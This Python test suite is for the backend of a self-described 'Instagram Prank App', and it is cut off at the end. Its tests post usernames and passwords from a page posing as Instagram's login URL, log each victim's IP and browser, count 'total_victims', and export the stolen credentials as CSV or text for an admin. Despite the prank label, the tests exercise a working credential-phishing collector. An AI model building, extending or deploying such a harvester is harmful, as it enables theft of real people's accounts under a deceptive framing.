#!/usr/bin/env python3
"""
Backend API Testing for Instagram Prank App
Tests the save-prank-credentials endpoint and related functionality
"""

import requests
import json
import os
import time
from pathlib import Path
from datetime import datetime

# Get backend URL from frontend .env file
def get_backend_url():
    frontend_env_path = Path("/app/frontend/.env")
    if frontend_env_path.exists():
        with open(frontend_env_path, 'r') as f:
            for line in f:
                if line.startswith('REACT_APP_BACKEND_URL='):
                    return line.split('=', 1)[1].strip()
    return "http://localhost:8001"

BACKEND_URL = get_backend_url()
API_BASE_URL = f"{BACKEND_URL}/api"

def test_root_endpoint():
    """Test the root API endpoint GET /api/"""
    print("🧪 Testing root endpoint GET /api/")
    try:
        response = requests.get(f"{API_BASE_URL}/")
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get("message") == "Hello World":
                print("   ✅ Root endpoint working correctly")
                return True
            else:
                print("   ❌ Unexpected response message")
                return False
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("   ❌ Connection failed - backend server may not be running")
        return False
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_save_prank_credentials_valid():
    """Test save-prank-credentials endpoint with valid data"""
    print("\n🧪 Testing POST /api/save-prank-credentials with valid data")
    
    # Create realistic test data
    test_data = {
        "email": "sarah.johnson@gmail.com",
        "password": "mySecretPass123",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=test_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if (data.get("success") == True and 
                "total_victims" in data and 
                data.get("victim_identifier") == test_data["email"]):
                print("   ✅ Save prank credentials endpoint working correctly")
                return True, data.get("total_victims", 0)
            else:
                print("   ❌ Response format incorrect")
                return False, 0
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False, 0
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False, 0

def test_data_persistence():
    """Test that data is actually saved to pranked_user.json"""
    print("\n🧪 Testing data persistence in pranked_user.json")
    
    pranked_users_file = Path("/app/backend/pranked_user.json")
    
    if not pranked_users_file.exists():
        print("   ❌ pranked_user.json file does not exist")
        return False
    
    try:
        with open(pranked_users_file, 'r') as f:
            data = json.load(f)
        
        print(f"   File exists with {len(data)} entries")
        
        if len(data) > 0:
            latest_entry = data[-1]
            print(f"   Latest entry: {latest_entry.get('emailOrUsername', 'N/A')}")
            
            # Check if entry has required fields
            required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
            missing_fields = [field for field in required_fields if field not in latest_entry]
            
            if not missing_fields:
                print("   ✅ Data persistence working correctly")
                return True
            else:
                print(f"   ❌ Missing fields in saved data: {missing_fields}")
                return False
        else:
            print("   ❌ No data found in file")
            return False
            
    except json.JSONDecodeError:
        print("   ❌ Invalid JSON in pranked_user.json")
        return False
    except Exception as e:
        print(f"   ❌ Error reading file: {str(e)}")
        return False

def test_invalid_payload():
    """Test error handling with invalid payloads"""
    print("\n🧪 Testing error handling with invalid payload")
    
    # Test with missing required fields
    invalid_data = {
        "email": "test@example.com"
        # Missing other required fields
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=invalid_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code == 422:  # FastAPI validation error
            print("   ✅ Proper validation error handling")
            return True
        elif response.status_code == 500:
            print("   ⚠️  Server error - may need better validation")
            return True  # Still acceptable for this test
        else:
            print(f"   ❌ Unexpected status code: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_cors_headers():
    """Test CORS headers for frontend requests"""
    print("\n🧪 Testing CORS headers")
    
    try:
        # Test preflight request
        response = requests.options(
            f"{API_BASE_URL}/save-prank-credentials",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        print(f"   Preflight Status Code: {response.status_code}")
        
        cors_headers = {
            "Access-Control-Allow-Origin": response.headers.get("Access-Control-Allow-Origin"),
            "Access-Control-Allow-Methods": response.headers.get("Access-Control-Allow-Methods"),
            "Access-Control-Allow-Headers": response.headers.get("Access-Control-Allow-Headers")
        }
        
        print(f"   CORS Headers: {cors_headers}")
        
        if (response.status_code in [200, 204] and 
            cors_headers["Access-Control-Allow-Origin"] in ["*", "http://localhost:3000"]):
            print("   ✅ CORS headers configured correctly")
            return True
        else:
            print("   ❌ CORS headers may not be configured properly")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_pranked_user_json_functionality():
    """
    Comprehensive test for pranked_user.json functionality as per review request:
    1. Clean slate initialization
    2. Submit 2 different payloads 
    3. Verify append semantics
    4. Test backward compatibility
    5. Validate response correctness
    """
    print("\n🧪 Testing pranked_user.json functionality (Review Request)")
    
    pranked_user_file = Path("/app/backend/pranked_user.json")
    
    # Step 1: Initialize with clean slate
    print("   Step 1: Removing existing pranked_user.json for clean slate")
    if pranked_user_file.exists():
        pranked_user_file.unlink()
        print("   ✅ Removed existing file")
    else:
        print("   ✅ No existing file to remove")
    
    # Step 2: Submit first payload
    print("   Step 2: Submitting first payload")
    payload1 = {
        "email": "alice.cooper@gmail.com",
        "password": "rockstar2024",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response1 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload1,
            headers={"Content-Type": "application/json"}
        )
        
        if response1.status_code != 200:
            print(f"   ❌ First payload failed with status {response1.status_code}")
            return False
            
        data1 = response1.json()
        print(f"   ✅ First payload saved. Response: {data1}")
        
        # Verify response format
        if not (data1.get("success") == True and 
                "total_victims" in data1 and 
                "victim_identifier" in data1 and 
                "victim_ip" in data1):
            print("   ❌ First response format incorrect")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with first payload: {str(e)}")
        return False
    
    # Step 3: Submit second payload
    print("   Step 3: Submitting second payload")
    payload2 = {
        "email": "bob_musician",  # Username format
        "password": "drummer123!",
        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response2 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload2,
            headers={"Content-Type": "application/json"}
        )
        
        if response2.status_code != 200:
            print(f"   ❌ Second payload failed with status {response2.status_code}")
            return False
            
        data2 = response2.json()
        print(f"   ✅ Second payload saved. Response: {data2}")
        
        # Verify response format and total_victims increment
        if not (data2.get("success") == True and 
                data2.get("total_victims") == 2 and
                data2.get("victim_identifier") == payload2["email"]):
            print(f"   ❌ Second response incorrect. Expected total_victims=2, got {data2.get('total_victims')}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with second payload: {str(e)}")
        return False
    
    # Step 4: Verify file contains array with 2 entries
    print("   Step 4: Verifying file contains array with 2 entries")
    
    if not pranked_user_file.exists():
        print("   ❌ pranked_user.json file was not created")
        return False
    
    try:
        with open(pranked_user_file, 'r') as f:
            file_data = json.load(f)
        
        if not isinstance(file_data, list):
            print(f"   ❌ File should contain array, got {type(file_data)}")
            return False
            
        if len(file_data) != 2:
            print(f"   ❌ Expected 2 entries, got {len(file_data)}")
            return False
        
        # Verify each entry has required fields
        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
        
        for i, entry in enumerate(file_data):
            missing_fields = [field for field in required_fields if field not in entry]
            if missing_fields:
                print(f"   ❌ Entry {i+1} missing fields: {missing_fields}")
                return False
        
        print(f"   ✅ File contains valid array with 2 entries")
        print(f"   Entry 1: {file_data[0]['emailOrUsername']}")
        print(f"   Entry 2: {file_data[1]['emailOrUsername']}")
        
    except json.JSONDecodeError:
        print("   ❌ Invalid JSON in pranked_user.json")
        return False
    except Exception as e:
        print(f"   ❌ Error reading file: {str(e)}")
        return False
    
    # Step 5: Test backward compatibility - file already exists with valid JSON
    print("   Step 5: Testing backward compatibility with existing valid JSON")
    
    payload3 = {
        "email": "charlie.brown@hotmail.com",
        "password": "snoopy456",
        "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response3 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload3,
            headers={"Content-Type": "application/json"}
        )
        
        if response3.status_code != 200:
            print(f"   ❌ Third payload (backward compatibility) failed with status {response3.status_code}")
            return False
            
        data3 = response3.json()
        
        if data3.get("total_victims") != 3:
            print(f"   ❌ Backward compatibility failed. Expected total_victims=3, got {data3.get('total_victims')}")
            return False
            
        print("   ✅ Backward compatibility test passed - appended to existing file")
        
    except Exception as e:
        print(f"   ❌ Error with backward compatibility test: {str(e)}")
        return False
    
    # Step 6: Test graceful handling of empty/invalid JSON
    print("   Step 6: Testing graceful handling of empty/invalid JSON")
    
    # Create empty file
    with open(pranked_user_file, 'w') as f:
        f.write("")
    
    payload4 = {
        "email": "diana.prince@amazon.com",
        "password": "wonderwoman",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response4 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload4,
            headers={"Content-Type": "application/json"}
        )
        
        if response4.status_code == 200:
            data4 = response4.json()
            print(f"   ✅ Empty file handled gracefully. Total victims: {data4.get('total_victims')}")
        elif response4.status_code == 500:
            print("   ⚠️  Empty file returned 500 - acceptable but could be improved")
        else:
            print(f"   ❌ Unexpected status code for empty file: {response4.status_code}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with empty file test: {str(e)}")
        return False
    
    print("   ✅ All pranked_user.json functionality tests passed!")
    return True

def test_multiple_entries():
    """Test saving multiple prank credentials"""
    print("\n🧪 Testing multiple entries")
    
    test_users = [
        {
            "email": "mike.wilson@yahoo.com",
            "password": "password123",
            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        },
        {
            "email": "jenny.smith",  # Username instead of email
            "password": "mypass456",
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        }
    ]
    
    success_count = 0
    
    for i, user_data in enumerate(test_users):
        try:
            response = requests.post(
                f"{API_BASE_URL}/save-prank-credentials",
                json=user_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"   Entry {i+1}: ✅ Saved {user_data['email']} (Total victims: {data.get('total_victims', 'N/A')})")
                success_count += 1
            else:
                print(f"   Entry {i+1}: ❌ Failed to save {user_data['email']}")
                
        except Exception as e:
            print(f"   Entry {i+1}: ❌ Error saving {user_data['email']}: {str(e)}")
    
    if success_count == len(test_users):
        print("   ✅ Multiple entries test passed")
        return True
    else:
        print(f"   ❌ Only {success_count}/{len(test_users)} entries saved successfully")
        return False

def test_get_pranked_credentials_endpoint():
    """
    Test the GET /api/pranked-credentials endpoint as per review request:
    1) Ensure it returns [] when backend/pranked_user.json is missing or empty
    2) After creating 2 entries via POST /api/save-prank-credentials, confirm it returns an array with those 2 entries and expected fields
    3) Check CORS and 200 status
    """
    print("\n🧪 Testing GET /api/pranked-credentials endpoint (Review Request)")
    
    pranked_user_file = Path("/app/backend/pranked_user.json")
    
    # Test 1: Missing file should return empty array
    print("   Test 1: Missing file should return []")
    if pranked_user_file.exists():
        pranked_user_file.unlink()
        print("   ✅ Removed existing file")
    
    try:
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        data = response.json()
        print(f"   Response: {data}")
        
        if data != []:
            print(f"   ❌ Expected empty array [], got {data}")
            return False
        
        print("   ✅ Missing file returns empty array correctly")
        
    except Exception as e:
        print(f"   ❌ Error testing missing file: {str(e)}")
        return False
    
    # Test 2: Empty file should return empty array
    print("   Test 2: Empty file should return []")
    try:
        with open(pranked_user_file, 'w') as f:
            f.write("")
        
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        data = response.json()
        print(f"   Response: {data}")
        
        if data != []:
            print(f"   ❌ Expected empty array [], got {data}")
            return False
        
        print("   ✅ Empty file returns empty array correctly")
        
    except Exception as e:
        print(f"   ❌ Error testing empty file: {str(e)}")
        return False
    
    # Test 3: Create 2 entries via POST and verify GET returns them
    print("   Test 3: Create 2 entries via POST and verify GET returns them")
    
    # Remove file to start fresh
    if pranked_user_file.exists():
        pranked_user_file.unlink()
    
    # Create first entry
    entry1 = {
        "email": "review_test_1@example.com",
        "password": "testpass123",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response1 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=entry1,
            headers={"Content-Type": "application/json"}
        )
        
        if response1.status_code != 200:
            print(f"   ❌ Failed to create first entry: {response1.status_code}")
            return False
        
        print("   ✅ Created first entry")
        
    except Exception as e:
        print(f"   ❌ Error creating first entry: {str(e)}")
        return False
    
    # Create second entry
    entry2 = {
        "email": "review_test_2@example.com",
        "password": "testpass456",
        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response2 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=entry2,
            headers={"Content-Type": "application/json"}
        )
        
        if response2.status_code != 200:
            print(f"   ❌ Failed to create second entry: {response2.status_code}")
            return False
        
        print("   ✅ Created second entry")
        
    except Exception as e:
        print(f"   ❌ Error creating second entry: {str(e)}")
        return False
    
    # Test 4: GET should now return array with 2 entries
    print("   Test 4: GET should return array with 2 entries and expected fields")
    
    try:
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        data = response.json()
        print(f"   Response length: {len(data)}")
        
        if not isinstance(data, list):
            print(f"   ❌ Expected array, got {type(data)}")
            return False
        
        if len(data) != 2:
            print(f"   ❌ Expected 2 entries, got {len(data)}")
            return False
        
        # Verify expected fields in each entry
        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
        
        for i, entry in enumerate(data):
            missing_fields = [field for field in required_fields if field not in entry]
            if missing_fields:
                print(f"   ❌ Entry {i+1} missing fields: {missing_fields}")
                return False
            print(f"   ✅ Entry {i+1}: {entry['emailOrUsername']} has all required fields")
        
        # Verify the entries match what we created
        emails_in_response = [entry['emailOrUsername'] for entry in data]
        expected_emails = ["review_test_1@example.com", "review_test_2@example.com"]
        
        for email in expected_emails:
            if email not in emails_in_response:
                print(f"   ❌ Expected email {email} not found in response")
                return False
        
        print("   ✅ GET returns correct array with 2 entries and all expected fields")
        
    except Exception as e:
        print(f"   ❌ Error testing GET with 2 entries: {str(e)}")
        return False
    
    # Test 5: Check CORS headers on GET request
    print("   Test 5: Check CORS headers on GET request")
    
    try:
        response = requests.get(
            f"{API_BASE_URL}/pranked-credentials",
            headers={"Origin": "http://localhost:3000"}
        )
        
        cors_origin = response.headers.get("Access-Control-Allow-Origin")
        print(f"   CORS Origin Header: {cors_origin}")
        
        if cors_origin not in ["*", "http://localhost:3000"]:
            print(f"   ❌ CORS header not properly configured: {cors_origin}")
            return False
        
        print("   ✅ CORS headers configured correctly for GET request")
        
    except Exception as e:
        print(f"   ❌ Error testing CORS headers: {str(e)}")
        return False
    
    print("   ✅ All GET /api/pranked-credentials endpoint tests passed!")
    return True

def test_admin_export_csv_endpoint():
    """
    Test GET /api/pranked-credentials/export?format=csv endpoint:
    - Returns 200 status code
    - Content-type is text/csv
    - Includes header with all fields
    """
    print("\n🧪 Testing GET /api/pranked-credentials/export?format=csv (Admin Export CSV)")
    
    pranked_user_file = Path("/app/backend/pranked_user.json")
    
    # Ensure we have some test data
    print("   Setting up test data...")
    if pranked_user_file.exists():
        pranked_user_file.unlink()
    
    # Create test entry
    test_entry = {
        "email": "csv_export_test@example.com",
        "password": "csvtest123",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        # Create test data
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=test_entry,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code != 200:
            print(f"   ❌ Failed to create test data: {response.status_code}")
            return False
        
        print("   ✅ Test data created")
        
        # Test CSV export
        response = requests.get(f"{API_BASE_URL}/pranked-credentials/export?format=csv")
        
        print(f"   Status Code: {response.status_code}")
        print(f"   Content-Type: {response.headers.get('content-type')}")
        
        # Check status code
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        # Check content type
        content_type = response.headers.get('content-type', '').lower()
        if 'text/csv' not in content_type:
            print(f"   ❌ Expected text/csv content-type, got {content_type}")
            return False
        
        # Check CSV content
        csv_content = response.text
        print(f"   CSV Content Preview: {csv_content[:200]}...")
        
        # Verify CSV has header with all required fields
        lines = csv_content.strip().split('\n')
        if len(lines) < 1:
            print("   ❌ CSV content is empty")
            return False
        
        header = lines[0]
        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
        
        for field in required_fields:
            if field not in header:
                print(f"   ❌ Required field '{field}' not found in CSV header")
                return False
        
        print("   ✅ CSV header contains all required fields")
        
        # Verify we have data rows (at least 1 beyond header)
        if len(lines) < 2:
            print("   ❌ CSV should have at least 1 data row beyond header")
            return False
        
        print(f"   ✅ CSV contains {len(lines)-1} data rows")
        
        # Check Content-Disposition header for download
        content_disposition = response.headers.get('content-disposition', '')
        if 'attachment' not in content_disposition or 'filename' not in content_disposition:
            print(f"   ⚠️  Content-Disposition header may be missing or incomplete: {content_disposition}")
        else:
            print("   ✅ Content-Disposition header configured for download")
        
        print("   ✅ CSV export endpoint working correctly")
        return True
        
    except Exception as e:
        print(f"   ❌ Error testing CSV export: {str(e)}")
        return False

def test_admin_export_txt_endpoint():
    """
    Test GET /api/pranked-credentials/export?format=txt endpoint:
    - Returns 200 status code
    - Content-type is text/plain
    - Returns lines per entry format
    """
    print("\n🧪 Testing GET /api/pranked-credentials/export?format=txt (Admin Export TXT)")
    
    try:
        # Test TXT export (using existing data from previous test)
        response = requests.get(f"{API_BASE_URL}/pranked-credentials/export?format=txt")
        
        print(f"   Status Code: {response.status_code}")
        print(f"   Content-Type: {response.headers.get('content-type')}")
        
        # Check status code
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        # Check content type
        content_type = response.headers.get('content-type', '').lower()
        if 'text/plain' not in content_type:
            print(f"   ❌ Expected text/plain content-type, got {content_type}")
            return False
        
        # Check TXT content format
        txt_content = response.text
        print(f"   TXT Content Preview: {txt_content[:200]}...")
        
        # Verify TXT has lines per entry format
        lines = txt_content.strip().split('\n')
        if len(lines) < 1:
            print("   ❌ TXT content is empty")
            return False
        
        # Check that each line contains expected format (key=value pairs)
        for i, line in enumerate(lines):
            if not line.strip():
                continue
            
            # Each line should contain key=value pairs separated by |
            if '|' not in line or '=' not in line:
                print(f"   ❌ Line {i+1} doesn't match expected format (key=value pairs with | separator)")
                return False
            
            # Check for expected keys
            expected_keys = ['id=', 'user=', 'pass=', 'ip=', 'ua=', 'url=', 'at=', 'ts=']
            found_keys = sum(1 for key in expected_keys if key in line)
            
            if found_keys < len(expected_keys):
                print(f"   ❌ Line {i+1} missing some expected keys")
                return False
        
        print(f"   ✅ TXT contains {len(lines)} properly formatted lines")
        
        # Check Content-Disposition header for download
        content_disposition = response.headers.get('content-disposition', '')
        if 'attachment' not in content_disposition or 'filename' not in content_disposition:
            print(f"   ⚠️  Content-Disposition header may be missing or incomplete: {content_disposition}")
        else:
            print("   ✅ Content-Disposition header configured for download")
        
        print("   ✅ TXT export endpoint working correctly")
        return True
        
    except Exception as e:
        print(f"   ❌ Error testing TXT export: {str(e)}")
        return False

def test_admin_delete_credential_endpoint():
    """
    Test DELETE /api/pranked-credentials/{id} endpoint:
    - Removes exactly that entry
    - Returns appropriate response
    - Handles non-existent IDs properly
    """
    print("\n🧪 Testing DELETE /api/pranked-credentials/{id} (Admin Delete Credential)")
    
    pranked_user_file = Path("/app/backend/pranked_user.json")
    
    # Setup: Create multiple test entries
    print("   Setting up test data with multiple entries...")
    if pranked_user_file.exists():
        pranked_user_file.unlink()
    
    test_entries = [
        {
            "email": "delete_test_1@example.com",
            "password": "deletetest1",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        },
        {
            "email": "delete_test_2@example.com", 
            "password": "deletetest2",
            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        },
        {
            "email": "delete_test_3@example.com",
            "password": "deletetest3", 
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        }
    ]
    
    created_ids = []
    
    try:
        # Create test entries
        for i, entry in enumerate(test_entries):
            response = requests.post(
                f"{API_BASE_URL}/save-prank-credentials",
                json=entry,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code != 200:
                print(f"   ❌ Failed to create test entry {i+1}: {response.status_code}")
                return False
        
        print("   ✅ Created 3 test entries")
        
        # Get all entries to find their IDs
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        if response.status_code != 200:
            print(f"   ❌ Failed to retrieve entries: {response.status_code}")
            return False
        
        all_entries = response.json()
        if len(all_entries) < 3:
            print(f"   ❌ Expected at least 3 entries, got {len(all_entries)}")
            return False
        
        # Get the ID of the second entry to delete
        target_id = all_entries[1]['id']
        target_email = all_entries[1]['emailOrUsername']
        
        print(f"   Target for deletion: ID={target_id}, Email={target_email}")
        
        # Test 1: Delete the specific entry
        print("   Test 1: Delete specific entry")
        delete_response = requests.delete(f"{API_BASE_URL}/pranked-credentials/{target_id}")
        
        print(f"   Delete Status Code: {delete_response.status_code}")
        
        if delete_response.status_code != 200:
            print(f"   ❌ Expected 200, got {delete_response.status_code}")
            return False
        
        delete_data = delete_response.json()
        print(f"   Delete Response: {delete_data}")
        
        if not delete_data.get('deleted'):
            print("   ❌ Delete response should indicate success")
            return False
        
        print("   ✅ Delete request successful")
        
        # Test 2: Verify the entry was actually removed
        print("   Test 2: Verify entry was removed")
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        if response.status_code != 200:
            print(f"   ❌ Failed to retrieve entries after delete: {response.status_code}")
            return False
        
        remaining_entries = response.json()
        print(f"   Remaining entries count: {len(remaining_entries)}")
        
        if len(remaining_entries) != 2:
            print(f"   ❌ Expected 2 remaining entries, got {len(remaining_entries)}")
            return False
        
        # Verify the specific entry was removed
        remaining_ids = [entry['id'] for entry in remaining_entries]
        if target_id in remaining_ids:
            print(f"   ❌ Target ID {target_id} still exists after deletion")
            return False
        
        remaining_emails = [entry['emailOrUsername'] for entry in remaining_entries]
        if target_email in remaining_emails:
            print(f"   ❌ Target email {target_email} still exists after deletion")
            return False
        
        print("   ✅ Target entry successfully removed, other entries preserved")
        
        # Test 3: Try to delete non-existent ID
        print("   Test 3: Delete non-existent ID")
        fake_id = "non-existent-id-12345"
        delete_response = requests.delete(f"{API_BASE_URL}/pranked-credentials/{fake_id}")
        
        print(f"   Non-existent ID Status Code: {delete_response.status_code}")
        
        if delete_response.status_code != 404:
            print(f"   ❌ Expected 404 for non-existent ID, got {delete_response.status_code}")
            return False
        
        print("   ✅ Non-existent ID properly returns 404")
        
        print("   ✅ DELETE endpoint working correctly")
        return True
        
    except Exception as e:
        print(f"   ❌ Error testing DELETE endpoint: {str(e)}")
        return False

def test_admin_clear_credentials_endpoint():
    """
    Test POST /api/pranked-credentials/clear endpoint:
    - Clears all entries
    - Subsequent GET returns []
    """
    print("\n🧪 Testing POST /api/pranked-credentials/clear (Admin Clear All)")
    
    try:
        # Ensure we have some data first (from previous tests)
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        if response.status_code != 200:
            print(f"   ❌ Failed to check existing data: {response.status_code}")
            return False
        
        existing_data = response.json()
        print(f"   Current entries count: {len(existing_data)}")
        
        # Test 1: Clear all credentials
        print("   Test 1: Clear all credentials")
        clear_response = requests.post(f"{API_BASE_URL}/pranked-credentials/clear")
        
        print(f"   Clear Status Code: {clear_response.status_code}")
        
        if clear_response.status_code != 200:
            print(f"   ❌ Expected 200, got {clear_response.status_code}")
            return False
        
        clear_data = clear_response.json()
        print(f"   Clear Response: {clear_data}")
        
        if not clear_data.get('cleared'):
            print("   ❌ Clear response should indicate success")
            return False
        
        print("   ✅ Clear request successful")
        
        # Test 2: Verify GET returns empty array
        print("   Test 2: Verify subsequent GET returns []")
        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
        
        print(f"   GET Status Code: {response.status_code}")
        
        if response.status_code != 200:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
        
        data = response.json()
        print(f"   GET Response: {data}")
        
        if data != []:
            print(f"   ❌ Expected empty array [], got {data}")
            return False
        
        print("   ✅ GET returns empty array after clear")
        
        # Test 3: Verify file is actually empty/cleared
        print("   Test 3: Verify file is actually cleared")
        pranked_user_file = Path("/app/backend/pranked_user.json")
        
        if pranked_user_file.exists():
            with open(pranked_user_file, 'r') as f:
                file_content = f.read().strip()
            
            if file_content:
                try:
                    file_data = json.loads(file_content)
                    if file_data != []:
                        print(f"   ❌ File should contain empty array, got {file_data}")
                        return False
                except json.JSONDecodeError:
                    print("   ❌ File contains invalid JSON after clear")
                    return False
        
        print("   ✅ File properly cleared")
        
        print("   ✅ CLEAR endpoint working correctly")
        return True
        
    except Exception as e:
        print(f"   ❌ Error testing CLEAR endpoint: {str(e)}")
        return False

def main():
    """Run all backend tests"""
    print("🚀 Starting Instagram Prank App Backend API Tests")
    print(f"   Backend URL: {BACKEND_URL}")
    print(f"   API Base URL: {API_BASE_URL}")
    print("=" * 60)
    
    test_results = []
    
    # Run all tests
    test_results.append(("Root Endpoint", test_root_endpoint()))
    
    # NEW: Test GET /api/pranked-credentials endpoint as per review request
    test_results.append(("GET Pranked Credentials Endpoint (Review)", test_get_pranked_credentials_endpoint()))
    
    # NEW: Test admin-related endpoints as per review request
    test_results.append(("Admin Export CSV Endpoint", test_admin_export_csv_endpoint()))
    test_results.append(("Admin Export TXT Endpoint", test_admin_export_txt_endpoint()))
    test_results.append(("Admin Delete Credential Endpoint", test_admin_delete_credential_endpoint()))
    test_results.append(("Admin Clear Credentials Endpoint", test_admin_clear_credentials_endpoint()))
    
    # Run comprehensive pranked_user.json test (covers the review requirements)
    test_results.append(("Pranked User JSON Functionality (Review)", test_pranked_user_json_functionality()))
    
    test_results.append(("Save Prank Credentials (Valid)", test_save_prank_credentials_valid()[0]))
    test_results.append(("Data Persistence", test_data_persistence()))
    test_results.append(("Invalid Payload Handling", test_invalid_payload()))
    test_results.append(("CORS Headers", test_cors_headers()))
    test_results.append(("Multiple Entries", test_multiple_entries()))
    
    # Final data persistence check
    test_results.append(("Final Data Persistence Check", test_data_persistence()))
    
    print("\n" + "=" * 60)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 60)
    
    passed = 0
    total = len(test_results)
    
